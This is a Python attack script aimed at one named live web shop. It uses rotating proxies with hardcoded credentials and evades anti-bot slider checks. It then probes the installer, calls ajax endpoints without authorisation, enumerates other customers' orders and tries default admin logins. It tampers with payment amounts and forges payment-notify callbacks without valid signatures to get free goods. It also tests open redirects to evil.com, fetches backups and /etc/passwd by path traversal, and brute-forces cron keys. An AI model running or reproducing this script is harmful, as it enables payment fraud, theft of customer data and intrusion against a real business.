#!/usr/bin/env python3
"""hmjf.lol 非卡密漏洞深挖 v4 — 业务逻辑/认证/重装链/彩虹特有接口"""
import json, os, re, subprocess, time, urllib.parse, hashlib

BASE = "https://hmjf.lol/shop"
OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/vuln_other_20260716")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
os.makedirs(OUT, exist_ok=True)

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()
N = 0
R = {"critical": [], "high": [], "medium": [], "low": [], "info": [], "tests": {}}

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(1.5)

def go(url, post=None, method=None, hdr=None, cookie=None, timeout=16):
    global N, PX
    N += 1
    if N % 70 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX]
    if cookie:
        c += ["-b", cookie]
    if method:
        c += ["-X", method]
    if hdr:
        for k, v in hdr.items():
            c += ["-H", f"{k}: {v}"]
    if post is not None:
        c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            time.sleep(6)
            refresh()
            return go(url, post, method, hdr, cookie, timeout)
        m = re.search(r"__C:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        return body, int(m.group(1)) if m else 0
    except Exception as e:
        return str(e), 0

def add(level, title, detail):
    entry = {"title": title, **detail}
    R[level].append(entry)
    print(f"[{level.upper()}] {title}: {str(detail)[:200]}", flush=True)

def save():
    json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)

def csrf_tid(tid=72):
    page, _ = go(f"{BASE}/?mod=buy&tid={tid}")
    csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
    hs = re.search(r'hashsalt\s*=\s*"([^"]+)"', page)
    return csrf.group(1) if csrf else "", hs.group(1) if hs else "", page

print("[1] install 重装链探测", flush=True)
for p in ["/install/", "/install/index.php", "/install/step2.php", "/install/step3.php",
          "/install/step4.php", "/install/step5.php", "/install/update.php",
          "/install/db.config.php", "/install/config.php"]:
    body, code = go(f"{BASE}{p}")
    R["tests"][p] = {"code": code, "len": len(body), "snip": body[:200]}
    if code == 200 and any(x in body for x in ["数据库", "database", "SYS_KEY", "管理员", "安装"]):
        add("critical" if "step" in p else "high", f"install路径可达 {p}", {"snippet": body[:250]})
    if "SYS_KEY" in body or "db_host" in body.lower():
        add("critical", f"install泄露配置 {p}", {"snippet": body[:300]})
save()

print("[2] 彩虹特有 ajax act", flush=True)
csrf, hs, _ = csrf_tid(72)
extra_acts = [
    ("workorder", "type=1&content=test&qq=123&orderid=1"),
    ("workorder", "type=2&content=test"),
    ("apply_refund", "trade_no=20260716031217345&reason=test"),
    ("apply_refund", "id=1&reason=test"),
    ("gift_start", "tid=72"),
    ("gift_stop", ""),
    ("share_invitegift_link", f"csrf_token={csrf}"),
    ("getshareid", ""),
    ("checklogin", ""),
    ("changepwd", "oldpwd=a&newpwd=b"),
    ("info", ""),
    ("list", ""),
    ("toollist", ""),
    ("upload", "type=img"),
    ("payrmb", "tid=72&num=1"),
    ("buy", "tid=72&num=1"),
    ("submit", "tid=72&num=1"),
    ("getgoods", "cid=1"),
    ("gettool", "tid=72"),
    ("gettool", "tid=1"),
    ("cart_add", "tid=72&num=1"),
    ("cart_add", "tid=72&num=-1"),
    ("cart_add", "tid=72&num=99999"),
    ("cart_info", ""),
    ("cart_list", ""),
    ("reg", "user=testprobe001&pass=Test123456&qq=123456&email=a@b.com"),
    ("login", "user=admin&pass=admin"),
    ("captcha", ""),
    ("getshuoshuo", f"csrf_token={csrf}"),
    ("getrizhi", f"csrf_token={csrf}"),
]
for act, post in extra_acts:
    body, code = go(f"{BASE}/ajax.php?act={act}", post=post)
    key = f"{act}|{post[:30]}"
    R["tests"][key] = {"code": code, "body": body[:220]}
    if '"code":0' in body and act in ("workorder", "apply_refund", "upload", "changepwd", "reg", "login"):
        add("high", f"ajax {act} 未授权/弱校验", {"post": post[:80], "resp": body[:200]})
    if act == "gettool" and '"code":0' in body and len(body) > 200:
        add("medium", f"gettool tid泄露 {post}", {"resp": body[:200]})
    if act == "cart_add" and '"code":0' in body and ("-1" in post or "99999" in post):
        add("high", f"cart_add 异常数量 {post}", {"resp": body[:200]})
    time.sleep(0.12)
save()

print("[3] query 订单枚举 (contact)", flush=True)
contacts = ["13800138000", "18888888888", "12345678901", "test", "datou111", "xuxin66vip",
            "kamitest", "admin", "1", "123456", "qq", "wx", "phone"]
for c in contacts:
    for post in [f"qq={c}", f"type=1&qq={c}", f"data={c}"]:
        body, _ = go(f"{BASE}/ajax.php?act=query", post=post)
        if body and '"code":0' in body and '"data"' in body and len(body) > 80:
            add("high", "query按联系方式枚举订单", {"contact": c, "post": post, "body": body[:400]})
        R["tests"][f"query_{c}_{post[:10]}"] = body[:150]
    time.sleep(0.1)
save()

print("[4] 支付业务逻辑", flush=True)
for tid in [72, 194, 558, 1]:
    csrf2, hs2, buy_page = csrf_tid(tid)
    if not csrf2:
        continue
    payloads = [
        ("price0", f"tid={tid}&num=1&hashsalt={hs2}&csrf_token={csrf2}&pay_type=alipay&money=0"),
        ("price001", f"tid={tid}&num=1&hashsalt={hs2}&csrf_token={csrf2}&pay_type=alipay&money=0.01"),
        ("num0", f"tid={tid}&num=0&hashsalt={hs2}&csrf_token={csrf2}&pay_type=alipay"),
        ("numneg", f"tid={tid}&num=-1&hashsalt={hs2}&csrf_token={csrf2}&pay_type=alipay"),
        ("tidswap", f"tid=72&num=1&hashsalt={hs2}&csrf_token={csrf2}&pay_type=alipay&tid=1"),
        ("coupon", f"tid={tid}&num=1&hashsalt={hs2}&csrf_token={csrf2}&pay_type=alipay&coupon=100"),
    ]
    for label, post in payloads:
        body, _ = go(f"{BASE}/ajax.php?act=pay", post=post)
        R["tests"][f"pay_{tid}_{label}"] = body[:180]
        tn = re.search(r"20\d{15}", body)
        if tn and '"code":0' in body:
            sh, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn.group(0)}")
            mo = re.search(r"money=([0-9.]+)", sh)
            if mo and float(mo.group(1)) < 1:
                add("critical", f"低价下单 tid={tid} {label}", {"trade_no": tn.group(0), "money": mo.group(1)})
    time.sleep(0.2)
save()

print("[5] epay_notify / return 深测", flush=True)
tn = "20260716031453854"
sh, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
params = dict(re.findall(r'name="([^"]+)"\s+value="([^"]+)"', sh))
base_qs = "&".join(f"{k}={urllib.parse.quote(v)}" for k, v in sorted(params.items()))
# 无sign / 错sign / TRADE_SUCCESS
tests = [
    ("nosign", base_qs + "&trade_status=TRADE_SUCCESS"),
    ("emptysign", base_qs + "&trade_status=TRADE_SUCCESS&sign="),
    ("wrongsign", base_qs + "&trade_status=TRADE_SUCCESS&sign=00000000000000000000000000000000"),
    ("money0", base_qs + "&trade_status=TRADE_SUCCESS&money=0"),
]
for label, qs in tests:
    body, _ = go(f"{BASE}/other/epay_notify.php?{qs}")
    gs, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
    R["tests"][f"epay_{label}"] = {"notify": body[:80], "getshop": gs[:100]}
    if "success" in body.lower() and "未付款" not in gs:
        add("critical", f"epay_notify绕过 {label}", {"notify": body[:100], "getshop": gs[:150]})
# return open redirect
for payload in ["http://evil.com", "//evil.com", "https://hmjf.lol.evil.com"]:
    body, code = go(f"{BASE}/other/epay_return.php?out_trade_no={tn}&url={urllib.parse.quote(payload)}")
    if "evil.com" in body or code in (301, 302):
        add("medium", "epay_return开放重定向", {"payload": payload, "code": code})
save()

print("[6] user 面 & chat & cookie", flush=True)
# session/cookie IDOR
body, _ = go(f"{BASE}/user/ajax_chat.php?act=get")
sid = re.search(r'"session_id"\s*:\s*"?(\d+)"?', body)
R["tests"]["chat_get"] = body[:200]
if '"code":0' in body:
    add("medium", "客服get未授权", {"resp": body[:150]})
for msg in ["probe_unauth", "<img src=x onerror=alert(1)>", "' OR 1=1--"]:
    body, _ = go(f"{BASE}/user/ajax_chat.php?act=send", post=f"content={urllib.parse.quote(msg)}")
    if '"code":0' in body:
        add("high", "客服send未授权", {"msg": msg, "resp": body[:150]})
# findpwd user enum
for u in ["admin", "test", "xuxin", "nonexist_xyz"]:
    body, _ = go(f"{BASE}/user/findpwd.php", post=f"user={u}&email=test@test.com")
    R["tests"][f"findpwd_{u}"] = body[:150]
    if "不存在" not in body and "成功" in body:
        add("low", f"findpwd用户枚举 {u}", {"resp": body[:100]})
# mysid
for sid_val in ["1", "2", "100", "admin"]:
    body, _ = go(f"{BASE}/?mod=query", cookie=f"mysid={sid_val}")
    if "showOrder" in body:
        add("high", "mysid IDOR", {"mysid": sid_val, "snippet": body[:200]})
save()

print("[7] 敏感路径扩展", flush=True)
paths = [
    "/.svn/entries", "/.DS_Store", "/web.config", "/composer.json", "/composer.lock",
    "/vendor/autoload.php", "/runtime/log/", "/logs/", "/log.txt", "/error.log",
    "/data/backup.sql", "/sql.sql", "/dump.sql", "/www.zip", "/site.zip",
    "/admin888/", "/administrator/", "/manage/login.php", "/user/shop.php",
    "/user/order.php", "/user/record.php", "/user/recharge.php",
    "/other/download.php", "/other/getshop.php?trade_no=../../../etc/passwd",
    "/assets/faka/js/faka.js", "/template/", "/includes/common.php",
    "/ajax.php.bak", "/config.php~", "/.config.php.swp",
]
for p in paths:
    url = BASE + p if not p.startswith("http") else p
    body, code = go(url)
    R["tests"][p] = {"code": code, "len": len(body), "snip": body[:120]}
    if code == 200 and len(body) > 50:
        if any(x in body.lower() for x in ["root:", "db_host", "db_pass", "sys_key", "create table"]) and "faka.js" not in p:
            add("critical", f"敏感文件泄露 {p}", {"snippet": body[:250]})
        elif p.endswith((".sql", ".zip", ".log")) and len(body) > 200:
            add("high", f"备份/日志暴露 {p}", {"size": len(body)})
    time.sleep(0.1)
save()

print("[8] getcount/gettoolnew/getclass 信息泄露", flush=True)
body, _ = go(f"{BASE}/ajax.php?act=getcount", post="")
if '"orders"' in body:
    add("high", "getcount经营数据未授权", {"body": body[:300]})
body, _ = go(f"{BASE}/ajax.php?act=gettoolnew", post="")
if '"data"' in body:
    try:
        items = json.loads(body).get("data", [])
        low_stock = [x for x in items if str(x.get("stock", "99")).isdigit() and int(x.get("stock", 99)) <= 5]
        if low_stock:
            add("medium", "gettoolnew低库存泄露", {"count": len(low_stock), "sample": low_stock[:3]})
    except Exception:
        pass
body, _ = go(f"{BASE}/ajax.php?act=getclass", post="")
if len(body) > 500:
    add("medium", "getclass分类全量未授权", {"len": len(body)})
save()

print("[9] Host/CORS/CRLF", flush=True)
body, code = go(f"{BASE}/ajax.php?act=getcount", post="",
               hdr={"Origin": "https://evil.example", "Access-Control-Request-Method": "POST"})
if "access-control-allow-origin" in body.lower():
    add("medium", "CORS配置宽松", {"body": body[:100]})
body, code = go(f"{BASE}/", hdr={"Host": "evil.com"})
R["tests"]["host_inject"] = {"code": code, "len": len(body)}
save()

print("[10] cron key 扩展爆破", flush=True)
keys = ["hmjf", "xuxin", "xuxin66", "xuxin66vip", "datou111", "datou333", "ttwl66", "1003",
        "faka", "shua", "cronkey", "monitor_key", "虚心", "虚心U", "lol", "shop", "2025", "2026"]
for k in keys:
    body, code = go(f"{BASE}/cron.php?key={urllib.parse.quote(k)}")
    if code == 200 and "不正确" not in body and len(body) > 20:
        add("high", f"cron key命中 {k}", {"resp": body[:200]})
    time.sleep(0.15)
save()

R["summary"] = {k: len(R[k]) for k in ["critical", "high", "medium", "low", "info"]}
save()
print(f"DONE {R['summary']}", flush=True)
